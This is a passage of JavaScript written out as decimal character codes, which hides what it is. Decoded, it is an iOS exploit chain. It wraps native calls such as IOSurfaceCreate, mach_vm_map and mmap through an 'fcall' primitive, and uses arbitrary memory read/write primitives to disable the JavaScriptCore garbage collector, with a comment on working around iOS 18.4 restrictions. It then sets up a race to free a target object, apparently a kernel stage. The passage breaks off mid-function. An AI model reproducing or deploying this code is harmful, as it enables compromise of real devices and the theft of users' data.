110, 32, 108, 115, 101, 101, 107, 40, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 76, 83, 69, 69, 75, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 115, 121, 110, 99, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 83, 89, 78, 67, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 40, 100, 105, 99, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 44, 32, 100, 105, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 124, 32, 40, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 60, 60, 32, 51, 50, 110, 41, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 109, 97, 112, 40, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 77, 65, 80, 44, 32, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 117, 110, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 85, 78, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 61, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 101, 110, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 47, 42, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 80, 114, 111, 98, 108, 101, 109, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 71, 67, 32, 105, 115, 32, 116, 114, 105, 103, 103, 101, 114, 105, 110, 103, 44, 32, 97, 110, 100, 32, 105, 116, 32, 99, 97, 108, 108, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 45, 62, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 46, 103, 101, 116, 82, 101, 103, 105, 115, 116, 101, 114, 115, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 105, 115, 32, 98, 97, 110, 110, 101, 100, 32, 98, 121, 32, 97, 117, 116, 111, 98, 111, 120, 32, 105, 110, 32, 62, 61, 49, 56, 46, 52, 32, 119, 104, 105, 99, 104, 32, 108, 101, 97, 100, 115, 32, 116, 111, 32, 99, 114, 97, 115, 104, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 83, 111, 108, 117, 116, 105, 111, 110, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 111, 32, 119, 111, 114, 107, 32, 99, 111, 114, 114, 101, 99, 116, 108, 121, 32, 105, 110, 32, 110, 111, 106, 105, 116, 32, 101, 110, 118, 105, 114, 111, 110, 109, 101, 110, 116, 32, 71, 67, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 115, 99, 97, 110, 32, 97, 116, 32, 108, 101, 97, 115, 116, 32, 116, 104, 101, 32, 115, 116, 97, 99, 107, 32, 111, 102, 32, 99, 117, 114, 114, 101, 110, 116, 32, 116, 104, 114, 101, 97, 100, 32, 119, 105, 116, 104, 32, 99, 97, 108, 108, 32, 116, 111, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 116, 32, 100, 111, 101, 115, 110, 39, 116, 32, 105, 110, 118, 111, 108, 118, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 115, 111, 32, 105, 116, 39, 115, 32, 115, 97, 102, 101, 32, 116, 111, 32, 100, 111, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 118, 111, 105, 100, 32, 77, 97, 99, 104, 105, 110, 101, 84, 104, 114, 101, 97, 100, 115, 58, 58, 103, 97, 116, 104, 101, 114, 67, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 40, 46, 46, 46, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 40, 99, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 44, 32, 106, 105, 116, 83, 116, 117, 98, 82, 111, 117, 116, 105, 110, 101, 115, 44, 32, 99, 111, 100, 101, 66, 108, 111, 99, 107, 115, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 46, 46, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 33, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 40, 108, 111, 99, 107, 101, 114, 44, 32, 98, 117, 102, 102, 101, 114, 44, 32, 99, 97, 112, 97, 99, 105, 116, 121, 44, 32, 38, 115, 105, 122, 101, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 41, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 114, 111, 119, 66, 117, 102, 102, 101, 114, 40, 115, 105, 122, 101, 44, 32, 38, 98, 117, 102, 102, 101, 114, 44, 32, 38, 99, 97, 112, 97, 99, 105, 116, 121, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 79, 110, 32, 116, 104, 101, 32, 111, 116, 104, 101, 114, 32, 104, 97, 110, 100, 44, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 119, 105, 108, 108, 32, 116, 114, 121, 32, 116, 111, 32, 105, 116, 101, 114, 97, 116, 101, 32, 116, 104, 114, 101, 97, 100, 115, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 97, 110, 100, 32, 99, 97, 108, 108, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 87, 101, 32, 99, 97, 110, 32, 97, 118, 111, 105, 100, 32, 105, 116, 32, 98, 121, 32, 110, 117, 108, 108, 105, 110, 103, 32, 102, 105, 114, 115, 116, 32, 109, 101, 109, 98, 101, 114, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 46, 116, 104, 114, 101, 97, 100, 115, 32, 119, 104, 105, 99, 104, 32, 112, 114, 101, 118, 101, 110, 116, 115, 32, 105, 116, 101, 114, 97, 116, 105, 111, 110, 32, 97, 110, 100, 32, 115, 116, 105, 108, 108, 32, 109, 97, 107, 101, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 114, 101, 116, 117, 114, 110, 32, 116, 114, 117, 101, 46, 10, 32, 32, 32, 32, 10, 32, 32, 32, 32, 42, 47, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 104, 101, 97, 112, 32, 43, 32, 48, 120, 49, 57, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 116, 104, 114, 101, 97, 100, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 116, 104, 114, 101, 97, 100, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 48, 120, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 114, 109, 101, 100, 34, 41, 59, 10, 125, 10, 10, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 59, 10, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 72, 101, 108, 108, 111, 32, 102, 114, 111, 109, 58, 32, 34, 32, 43, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 46, 104, 101, 120, 40, 41, 41, 59, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 58, 32, 34, 32, 43, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 46, 104, 101, 120, 40, 41, 41, 59, 10, 10, 108, 101, 116, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 61, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 56, 110, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 48, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 56, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 48, 110, 59, 10, 108, 101, 116, 32, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 108, 101, 116, 32, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 51, 48, 110, 59, 10, 10, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 32, 123, 10, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 117, 114, 101, 97, 100, 54, 52, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 